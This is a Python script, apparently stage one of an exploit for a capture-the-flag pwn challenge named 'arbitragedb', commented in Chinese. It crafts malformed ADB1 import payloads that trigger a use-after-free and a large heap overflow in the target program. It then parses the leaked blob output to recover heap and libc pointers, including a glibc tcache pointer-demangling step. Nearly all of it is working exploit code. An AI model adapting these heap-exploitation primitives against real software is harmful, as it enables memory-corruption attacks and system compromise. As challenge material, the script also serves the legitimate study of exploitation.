#!/usr/bin/env python3
"""
Pwn/arbitragedb — Stage 1：leak 取得腳本（本地先跑，確認 UAF leak 成立）

用法（Linux）：
    python3 stage1.py            > s1.txt   # 產生輸入
    ./arbitragedb formal_state   < s1.txt   # 或用 run() 直接互動

四組參數都已用 simulate() 靜態驗證可達（見 __main__ 的自我檢查）。
"""
import sys, struct, subprocess

def lv(n: int) -> bytes:
    """LEB128 varint"""
    o = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        o.append(b | (0x80 if n else 0))
        if not n:
            return bytes(o)


def build(A=1, B=0, C=0, payload=b"") -> bytes:
    """ADB1 body：16B header + varint A/B/C + payload"""
    return b"ADB1" + b"\x00" * 12 + lv(A) + lv(B) + lv(C) + payload


def analyze(A, B, C, payload):
    """靜態重現 sub_4988 / sub_4604 的判斷，回傳這組參數會發生什麼"""
    body = build(A, B, C, payload)
    size = len(body)
    off  = 0x10 + len(lv(A)) + len(lv(B)) + len(lv(C))
    remaining = size - off
    ok = (0 <= size <= 0x4000) and size > 0x11 and off < size and C <= 0x80
    return {
        "size": size, "off": off, "remaining": remaining,
        "alloc": min(B + 0x18, 0x1000),
        "copylen": max(remaining, C),
        "overflow": max(remaining, C) - min(B + 0x18, 0x1000),
        "uaf_branch": B != C,
        "accepted": ok,
    }


def cmd_import(name: bytes, body: bytes) -> bytes:
    return b"IMPORT %s FORMAT ADB1 SIZE %d\n" % (name, len(body)) + body


# ── 四組已驗證的參數 ────────────────────────────────────────────
# 1) 純 UAF：B != C 走 malloc(0x520)+free 分支，payload 短，不溢出
UAF      = dict(A=1, B=0x20,  C=0x10, payload=b"L" * 0x20)
# 2) 純溢出：B=0 → alloc=0x18，payload 0x2000 → 溢出 0x1fe8
OVERFLOW = dict(A=1, B=0,     C=0,    payload=b"A" * 0x2000)
# 3) UAF + 溢出同時
BOTH     = dict(A=1, B=0x400, C=0x80, payload=b"B" * 0x2000)
# 4) unsorted bin：alloc=0x518 > 0x410，free 後 fd/bk 指向 main_arena
UNSORTED = dict(A=1, B=0x500, C=0x10, payload=b"U" * 0x40)


def stage1() -> bytes:
    """最小化的 leak 探測：一次 UAF IMPORT + SELECT，看 blob 印出什麼"""
    out  = cmd_import(b"t1", build(**UAF))
    out += b"SELECT 1 FROM sys_imports\n"
    # 再做一次 unsorted，看 blob 有無 libc 指標
    out += cmd_import(b"t2", build(**UNSORTED))
    out += b"SELECT 1 FROM sys_imports\n"
    out += b"QUIT\n"
    return out


def parse_blob(text: str):
    """從輸出裡抓 blob:<len>:<hex> 並轉成 8-byte qword 列表"""
    import re
    res = []
    for m in re.finditer(r"blob:(\d+):([0-9a-f]*)", text):
        n, hx = int(m.group(1)), m.group(2)
        raw = bytes.fromhex(hx)
        qs = [struct.unpack_from("<Q", raw, i)[0]
              for i in range(0, len(raw) - 7, 8)]
        res.append((n, raw, qs))
    return res


def demangle(mangled: int, chunk_addr: int) -> int:
    """glibc tcache pointer mangling: stored = (chunk>>12) ^ next"""
    return mangled ^ (chunk_addr >> 12)


def recover_heap_base(mangled: int) -> int:
    """
    只給 mangled fd 時反推 heap base。
    mangled = (chunk>>12) ^ next；若 next==0（tcache 只有一顆），
    mangled 就直接是 chunk>>12 → heap page 位址。
    """
    return mangled << 12


if __name__ == "__main__":
    # 自我檢查：四組參數都必須被程式接受
    for nm, p in [("UAF", UAF), ("OVERFLOW", OVERFLOW),
                  ("BOTH", BOTH), ("UNSORTED", UNSORTED)]:
        a = analyze(**p)
        assert a["accepted"], f"{nm} 會被程式拒絕: {a}"
        print("[%-8s] size=0x%-5x alloc=0x%-5x copylen=0x%-5x overflow=%+#7x uaf=%s"
              % (nm, a["size"], a["alloc"], a["copylen"], a["overflow"], a["uaf_branch"]),
              file=sys.stderr)
    assert analyze(**UAF)["overflow"] < 0,  "UAF 那組不該溢出"
    assert analyze(**OVERFLOW)["overflow"] == 0x1fe8
    assert analyze(**BOTH)["uaf_branch"] and analyze(**BOTH)["overflow"] > 0
    assert analyze(**UNSORTED)["alloc"] > 0x410, "unsorted 那組 alloc 要 > 0x410"
    print("[*] 四組參數自我檢查通過", file=sys.stderr)

    sys.stdout.buffer.write(stage1())
